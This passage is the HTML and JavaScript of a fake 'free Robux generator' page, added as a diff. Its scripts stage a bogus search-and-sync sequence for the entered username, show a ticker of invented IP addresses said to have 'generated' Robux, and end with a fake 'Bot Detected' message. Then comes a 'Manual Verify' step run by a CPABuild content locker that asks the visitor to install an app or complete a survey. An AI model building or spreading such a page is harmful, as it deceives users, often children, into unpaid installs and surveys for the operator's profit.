+<div class="card cardcolor rotate-in-2-bck-ccw" style="background:#262626;color:white" id="card3" onclick="Selectedcard(3)">
+  <div class="cardicon"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="width:100%"></div>
+  <div class="card3-sub" id="sub3" style="display:none">
+  <div class="cardicon2 pulse"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="width:90%"></div>
+  <div class="cardicon3 pulse"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="width:90%"></div>
+
+
+  </div>
+  <div class="cardvalue"><span id="cardvalue3">5,000</span></div>
+  <div class="cardname">Robux</div>
+</div>
+</div>
+<div class="cardform" id="cardf4">
+<div class="cardcolor card  rotate-in-2-bck-ccw" style="background:#262626;color:white" id="card4" onclick="Selectedcard(4)">
+  <div class="cardicon"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="width:100%"></div>
+  <div class="card4-sub" id="sub4" style="display:none">
+  <div class="cardicon2 pulse"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="width:90%"></div>
+  <div class="cardicon3 pulse"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="width:90%"></div>
+  <div class="cardicon4 pulse"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="width:90%"></div>
+  <div class="cardicon5 pulse"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="width:90%"></div>
+  </div>
+<div class="cardvalue"><span id="cardvalue4">10,000</span></div>
+<div class="cardname">Robux</div>
+    </div>
+    </div>
+<div class="bntform form3">
+  <div class="selectedamountbnt">SELETED AMOUNT</div>
+  <img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="    width: 23px;
+    position: absolute;
+    left: 25px;
+    top: 25px;"><div class="selectedvalue" id="selectedvalue">1,000 Robux</div>
+    <div class="bnt bntcolor" onclick="genpage2()">NEXT</div>
+	<div class="hand"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/167297105251cd10b999549b1c10c93daad18b366b.png" style="width:100%;"></div>
+	
+    </div>
+
+
+    </div>
+
+    <div class="genpage2 formcolor showin" style="display:none;background:radial-gradient(circle, #fde38e, #bfab70);color:white" id="genpage2" >
+<div class="maintext" style="color:#121212" >PERSONAL INFORMATION</div>
+<center>
+  <div class="" style="    max-width: 320px;
+    width: 90%;
+    text-align: center;
+    font-size: 32px;
+    background-color: #dddddd;
+    border-radius: 10px;
+    box-shadow: 0 0 20px #00000033;
+    margin-bottom: 10px;">
+<center><div class="profileicon"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113033eef9c6b56d05c4619bdff35ce64a8cac.png" style="width:100%;"></div></center>
+<div class="loading" id="searchingform">
+  <span style="font-weight: bold;color: #b38a0a;font-size:26px;" id="searchinguser">Searching For Player </span>
+  <div class="subtext"><span id="searchname" style="font-weight: bold;color: #b38a0a;font-size: 40px;"></span></div>
+<div class="lds-dual-ring"></div>
+</div>
+
+<div class="showin" id="accinfo" style="display:none;">
+<div class="subtext"><span id="name" style="font-weight: bold;color: #b38a0a;font-size: 40px;"></span></div>
+<div class="subtext"><div style="display:inline-block;position:relative;"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" style="    width: 30px;    position: absolute;    top: -27px;    left: 7px;"></div><span id="amount" style="font-weight: bold;color: #b38a0a;margin-left:43px;">1000</span></div>
+<div class="subtext"><span id="platform" style="font-weight: bold;color: #b38a0a;">platform</span></div>
+</div>
+
+    </div>
+    <div class="genform showin" id="genform">
+      <center>
+
+    <div class="Entername flip-in-hor-bottom" id="gentextform" style="display:none;    color: #000000;
+    padding: 10px;
+    background-color: #ffffff;
+    box-shadow: 0 0 20px 0px #00000045;">
+
+    <div id="lastinfo" class="zoomoutin" style="display:none  ;  font-family: roboto;">
+      Hello <span id="genname" class="gencolor"></span> ! You are almost done with synchronization of <span id="genamount" class="gencolor"></span> Robux! Please complete the last step by click the Manual Verify button below to finish with synchronization
+      process.
+    </div>
+    <div class="lds-dual-ring2"></div><br>
+
+      <div id="gen-text" class="zoominout2">Connecting....</div>
+      <img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1672113030add4cded1f47f164cb7fd1a44683b656.png" class="flash2"style=" display:none;   width: 23px;
+        left: 25px;
+        top: 25px;" id="imgicongen">
+        <div style="    color: #5e5e5e;    font-size: 22px;    font-weight: bold;" id="loadingpecentage">0%</div>
+      <br><div class="lds-ripple"><div></div><div></div></div>
+    <div class="bnt showin  bntverify" id="bntverify" onclick="CPABuildLock()" style="display: block;
+    position: relative;
+    max-width: 230px;
+width:90%;
+    border-style: solid;
+    border-color: #d13b3b;display:none;
+    box-shadow: 0 0 2px black;padding: 6px 0;">Manual Verify<div style="font-size:11px;font-family:roboto">(Install an app Or Complete a short survey)</div>
+			<div class="hand" style="top:10px;"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/167297105251cd10b999549b1c10c93daad18b366b.png" style="width:100%;"></div>
+			</div>
+
+    </div>
+
+    </center>
+    </div>
+        <div class="bnt noselect bntcolor" style="width:200px;text-align:center;position:relative;display:none" id="genbnt"onclick="gen()">
+					<div class="hand" style="top:13px;"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/167297105251cd10b999549b1c10c93daad18b366b.png" style="width:100%;"></div>
+		GENERATE</div>
+
+</center>
+
+      </div>
+
+
+  <div class="contactpage formcolor showin" id="contactpage"  style="display:none;background:radial-gradient(circle, #fde38e, #bfab70);color:white">
+    <div class="info-text" style="    font-family: Roboto;
+    padding: 10px 10px 0 10px;
+    color: #525252;
+    text-align: center;">You can reach our team by using this form</div>
+
+    <div class="info1 info" id="contactdata">
+
+      <div class="container" style="color: #3e3e3e;
+    font-family: Roboto;
+    padding-left: 5px;
+    text-align: left;">
+        <br>
+          <label for="fname">Your E-mail</label>
+          <input class="textcontact" type="text" id="fname" name="firstname" placeholder="Your E-mail*">
+    <br>
+          <label for="subject">Subject</label>
+<br>
+          <textarea class="textcontact" id="subject" name="subject" placeholder="Message.." style="height:200px"></textarea>
+
+          <center><input class="noselect" style="
+    font-size: 12px;
+    border-radius: 10px;
+    font-size: 18px;
+    background-color: #323232;
+    border-style: solid;
+    border-color: #8b8b8b;
+    padding: 11px;
+    color: white;
+    border-width: 1px;cursor: pointer;" type="submit" value="Send us a message"></center>
+      </div>
+
+    </div>
+
+
+
+    </div>
+    <div class="footer">
+      <div class="row">
+        <div class="col-md-12 text-center"><a href="#">Privacy Policy </a><span> | </span><a href="#">Terms Of Service</a><span> | </span><a href="#">Contact Us</a><span style="font-family: Roboto;font-weight"><br />© Copyright 2022, all rights
+            reserved.<br />All trademarks, service marks, trade names, trade dress, product names and logos appearing on the site are the property of their respective owners.<br /></span></div>
+      </div>
+    </div>
+</div>
+
+  </body>
+<script src="main.js"></script>
+  </html>
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+    var CPABUILDSETTINGS={"it":3575358,"key":"03a54"};
+    var forward="";
+    CPABUILDSETTINGS.onComplete=function(data){
+        window.location=forward;
+        return false;
+    };
+</script>
+<script src="https://d2bb5k76l7oivo.cloudfront.net/8dd3c6d.js"></script>
+<script type="text/javascript">
+    $('.showContentLocker').click(function(){
+       CPABuildLock();
+        return false;
+    });
+</script>
+<script>
+
+</script>
+<script type="text/javascript">
+    if(navigator.userAgent.match(/iPhone/i)){
+   var DeviceType='Iphone';
+}else if(navigator.userAgent.match(/iPad/i)){
+   var DeviceType='Ipad';
+}else if(navigator.userAgent.match(/Mac OS X/i)){
+   var DeviceType='Mac';
+}else if(navigator.userAgent.match(/Android/i)){
+   var DeviceType='Android' ;
+}else{
+   var DeviceType='PC';
+}
+
+var cardvalue1="1,500";
+var cardvalue2="3,000";
+var cardvalue3="6,000";
+var cardvalue4="13,500";
+var coinname="Robux";
+
+document.getElementById("cardvalue1").innerHTML = cardvalue1;
+document.getElementById("cardvalue2").innerHTML = cardvalue2;
+document.getElementById("cardvalue3").innerHTML = cardvalue3;
+document.getElementById("cardvalue4").innerHTML = cardvalue4;
+
+
+        document.getElementById("platform").innerHTML = DeviceType;
+var flaglist = ["https://d13pxqgp3ixdbh.cloudfront.net/uploads/166925980834c338e88d8d6a36aa7991dadc02a74c.png",
+ "https://d13pxqgp3ixdbh.cloudfront.net/uploads/16389383734ec9fbc32bce520e644e85f3bc441122.png",
+"https://d13pxqgp3ixdbh.cloudfront.net/uploads/16389382062ae9d099f38c341320b82dbcd925a5cf.png",
+"https://d13pxqgp3ixdbh.cloudfront.net/uploads/16389380805bbaae713e1803ac265a52316697dd78.png",
+"https://d13pxqgp3ixdbh.cloudfront.net/uploads/16389383331871ca6888859d2f72c332f099b871f8.png",
+"https://d13pxqgp3ixdbh.cloudfront.net/uploads/16389383331871ca6888859d2f72c332f099b871f8.png",
+"https://d13pxqgp3ixdbh.cloudfront.net/uploads/16389383331871ca6888859d2f72c332f099b871f8.png",
+"https://d13pxqgp3ixdbh.cloudfront.net/uploads/16389382810a1d68813455b9f6d983ea592a71cb06.png"
+ ];
+
+
+
+
+var data="";
+var amount = [cardvalue1,
+cardvalue2,
+cardvalue3,
+cardvalue4
+];
+var gennamelist = ["1.7.215.154", "14.70.15.14", "27.7.25.14","14.9.115.104",
+"14.86.215.11",
+"17.32.15.18",
+"42.75.155.151",
+"47.88.215.157",
+"49.38.32.159",
+"59.28.75.184",
+"61.51.85.114",
+"110.55.95.124",
+"111.187.42.134",
+"112.185.22.174",
+"114.199.37.4",
+"115.187.39.104",
+"118.158.42.124",
+"119.111.12.174",
+"120.11.21.194",
+"122.21.81.114",
+"124.99.31.15",
+"125.88.24.154",
+"136.37.20.154",
+"139.28.115.154",
+"146.19.15.18",
+"147.38.144.14",
+"152.78.132.24",
+"158.24.181.354",
+"162.17.195.48",
+"15.70.75.174"];
+
+for (let i = 0; i < 20; i++) {
+var getflag=flaglist[Math.floor(Math.random() * 8)];
+      var getamount=amount[Math.floor(Math.random() * 4)];
+ var name=gennamelist[Math.floor(Math.random() * 30)];
+data=data +'<div id="flag1" class="flag1" style="display:inline-block;"><img src="'+ getflag +'"class="flag">'+name+' Generated: <b> '+ getamount +' </b>'+coinname+', </div>'+' ';
+}
+document.getElementById("winnertext").innerHTML=data;
+var date = new Date();
+var current_date =date.getDate()+"/"+ (date.getMonth()+1);
+document.getElementById("updatedate").innerHTML = current_date;
+function  Selectedcard(value){
+  document.getElementById("card1").style.borderColor ="#bbbbbb";
+document.getElementById("card1").style.textShadow = "";
+document.getElementById("card2").style.borderColor ="#bbbbbb";
+document.getElementById("card2").style.textShadow = "";
+document.getElementById("card3").style.borderColor ="#bbbbbb";
+document.getElementById("card3").style.textShadow = "";
+document.getElementById("card4").style.borderColor ="#bbbbbb";
+document.getElementById("card4").style.textShadow = "";
+document.getElementById("card4").style.color = "white";
+document.getElementById("card3").style.color = "white";
+document.getElementById("card2").style.color = "white";
+document.getElementById("card1").style.color = "white";
+  document.getElementById("cardf1").classList.remove("zoomout1");
+    document.getElementById("cardf2").classList.remove("zoomout1");
+      document.getElementById("cardf3").classList.remove("zoomout1");
+        document.getElementById("cardf4").classList.remove("zoomout1");
+
+    document.getElementById("card"+value).style.borderColor ="#b39e63";
+    document.getElementById("card"+value).style.color = "white";
+document.getElementById("card"+value).style.textShadow = "0 0 2px #cebc81";
+  document.getElementById("cardf"+value).classList.add("zoomout1");
+    document.getElementById("sub2").style.display="none";
+      document.getElementById("sub3").style.display="none";
+        document.getElementById("sub4").style.display="none";
+  if (value==1){
+        document.getElementById("selectedvalue").innerHTML ="   " + cardvalue1 + " Robux";
+            selectedamount=cardvalue1;
+  }
+  if (value==2){
+        document.getElementById("sub2").style.display="block";
+        document.getElementById("selectedvalue").innerHTML = cardvalue2 + " Robux";
+          selectedamount=cardvalue2;
+  }
+  if (value==3){
+        document.getElementById("sub3").style.display="block";
+        document.getElementById("selectedvalue").innerHTML = cardvalue3 + " Robux";
+          selectedamount=cardvalue3;
+  }
+  if (value==4){
+        document.getElementById("sub4").style.display="block";
+        document.getElementById("selectedvalue").innerHTML = cardvalue4 + "  Robux";
+          selectedamount=cardvalue4;
+  }
+  document.getElementById("amount").innerHTML=selectedamount;
+}
+
+
+
+function  menu(value){
+  if (genrun==0){
+if (value==1){
+      document.getElementById("infopage").style.display="block";
+            document.getElementById("menuinfo").classList.add("selectedmenu");
+    document.getElementById("genpage").style.display="none";
+      document.getElementById("menugen").classList.remove("selectedmenu");
+            document.getElementById("menucontact").classList.remove("selectedmenu");
+                document.getElementById("contactpage").style.display="none";
+}
+if (value==2){
+      document.getElementById("infopage").style.display="none";
+    document.getElementById("genpage").style.display="block";
+    document.getElementById("menuinfo").classList.remove("selectedmenu");
+        document.getElementById("menugen").classList.add("selectedmenu");
+              document.getElementById("menucontact").classList.remove("selectedmenu");
+    document.getElementById("contactpage").style.display="none";
+}
+if (value==3){
+      document.getElementById("infopage").style.display="none";
+    document.getElementById("genpage").style.display="none";
+    document.getElementById("contactpage").style.display="block";
+      document.getElementById("menucontact").classList.add("selectedmenu");
+    document.getElementById("menuinfo").classList.remove("selectedmenu");
+        document.getElementById("menugen").classList.remove("selectedmenu");
+}
+}
+}
+var genrun=0;
+function genpage2(){
+  name=document.getElementById("uid").value;
+  if (name==""){
+    document.getElementById("uid").style.boxShadow="inset 0 0 11px 0px #f71c1c";
+ document.getElementById('uid').focus();
+  }else{
+    genrun=1;
+
+        document.getElementById("name").innerHTML=name;
+          document.getElementById("searchname").innerHTML=name;
+         document.getElementById("genpage").style.display="none";
+      document.getElementById("genpage2").style.display="block";
+      myInterval31=setInterval(function() {
+         document.getElementById("searchinguser").innerHTML="Player Found";
+          document.getElementById("searchinguser").style.color="#00b06f";
+                      clearInterval(myInterval31)
+                      myInterval32=setInterval(function() {
+                        console.log("test");
+                         document.getElementById("searchingform").style.display="none";
+               document.getElementById("accinfo").style.display="block";
+                            document.getElementById("genbnt").style.display="block";
+                            clearInterval(myInterval32)
+                        }, 2000);
+
+        }, 2000);
+
+    }
+}
+function gen(){
+  console.log("gen");
+  name=document.getElementById("uid").value;
+  if (name==""){
+    document.getElementById("uid").style.boxShadow="inset 0 0 11px 0px #f71c1c";
+  }else{
+    document.getElementById("genbnt").style.display="none";
+document.getElementById("gentextform").style.display="block";
+    document.getElementById("genform").style.display="block";
+  myInterval1=setInterval(function() {
+
+      clearInterval(myInterval1)
+  myInterval2=setInterval(function() {
+    document.getElementById("gen-text").innerHTML="UTHORIZING ID...";
+
+      clearInterval(myInterval2)
+    myInterval3=setInterval(function() {
+                document.getElementById("gen-text").style.color="#07eb10";
+      document.getElementById("gentextform").classList.add("zoomoutin");
+      document.getElementById("gen-text").innerHTML="ID FOUND!";
+        document.getElementById("gen-text").style.color="5e5e5e";
+        clearInterval(myInterval3)
+      myInterval4=setInterval(function() {
+
+  var pnumber=10;
+              myInterval33=setInterval(function() {
+                  document.getElementById("imgicongen").style.display="block";
+            document.getElementById("loadingpecentage").innerHTML=pnumber + "%";
+            pnumber=pnumber+1;
+            if (pnumber>=98){
+                    clearInterval(myInterval33)
+            }
+
+          }, 110);
+
+
+                document.getElementById("gen-text").style.color="5e5e5e";
+        document.getElementById("gen-text").innerHTML='Syncing <span class="gencolor">' +  selectedamount + '</span> Robux for <span class="gencolor">' + name +'</span>' ;
+
+          clearInterval(myInterval4)
+        myInterval5=setInterval(function() {
+
+          document.getElementById("gen-text").innerHTML='Syncing <span class="gencolor">' +  selectedamount + '</span> Robux for <span class="gencolor">' + name +'</span>' ;
+          document.getElementById("gen-text").style.color="#5e5e5e";
+            clearInterval(myInterval5)
+          myInterval6=setInterval(function() {
+            document.getElementById("loadingpecentage").innerHTML="96%";
+            document.getElementById("gen-text").innerHTML='Syncing <span class="gencolor">' +  selectedamount + '</span> Robux for <span class="gencolor">' + name +'</span>' ;
+            document.getElementById("gen-text").style.color="#5e5e5e";
+
+              clearInterval(myInterval6)
+            myInterval7=setInterval(function() {
+                  document.getElementById("loadingpecentage").innerHTML="97%";
+              document.getElementById("gen-text").innerHTML='Syncing <span class="gencolor">' +  selectedamount + '</span> Robux for <span class="gencolor">' + name +'</span>' ;
+              document.getElementById("gen-text").style.color="#5e5e5e";
+
+                clearInterval(myInterval7)
+              myInterval8=setInterval(function() {
+                document.getElementById("gen-text").innerHTML="Bot Detected!";
+                document.getElementById("gen-text").style.color="#ff6262";
+                  document.getElementById("loadingpecentage").style.display="none";
+                          document.getElementById("imgicongen").style.display="none";
+                  clearInterval(myInterval8)
+                myInterval9=setInterval(function() {
+
+                  document.getElementById("lastinfo").style.display="block";
+                  document.getElementById("genname").innerHTML="@"+name;
+                  document.getElementById("genamount").innerHTML=selectedamount;
+                  document.getElementById("gen-text").innerHTML="MANUAL VERIFICATION REQUIRED";
+                  document.getElementById("gen-text").style.color="#ff1740";
+                      document.getElementById("bntverify").style.display="block";
+
+window.scrollBy(0, 250);
+      clearInterval(myInterval9)
+                  }, 1000);
+                }, 5000);
+              }, 1000);
+            }, 5000);
+          }, 1000);
+        }, 3000);
+      }, 2000);
+    }, 1000);
+
+}, 1000);
+
+}
+
+
+}
+
+
+</script>
+<script>
+    if(typeof window.ga === 'function'){
+        ga('create', 'UA-85922709-2', 'auto', 'customTemplateGlobal');
+        ga('customTemplateGlobal.set', 'dimension1', typeof window.CPBContentLocker === 'function' ? 0 : 1);
+        ga('customTemplateGlobal.send', 'pageView');
+    }
+
+
+</script>
+</body>
+</html>
